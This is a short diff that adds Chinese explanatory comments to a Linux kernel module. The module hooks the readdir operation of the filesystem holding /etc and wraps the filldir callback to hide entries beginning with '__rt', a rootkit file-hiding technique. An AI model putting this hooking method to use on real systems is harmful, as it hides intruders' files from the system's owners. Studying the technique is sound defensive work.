@@ -109,7 +109,8 @@ static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offse
 	//过滤掉__rt开头和10__rt
 	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
-
+//不同的目录可以有不同的readdir，不同的reddir传入同一个回调函数fs_filldir
+//如果把fs_filldir替换掉，那么所有目录都被hack
 static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
 {
 	fs_filldir_orig = filldir;
@@ -232,9 +233,11 @@ static int __init fs_init(void)
 	//get file_operations of /etc
 	//对/etc这个目录下的操作进行hack
 	etc_filp = filp_open("/etc", O_RDONLY, 0);
+	//该函数返回strcut file*结构指针
 	if (etc_filp == NULL) return 0;
 	
 	fs_fops = (struct file_operations *) etc_filp->f_op;
+	//vfs结构，里面包含了各种文件操作函数的指针
 	filp_close(etc_filp, NULL);
 	
 	//substitute readdir of fs on which /etc is
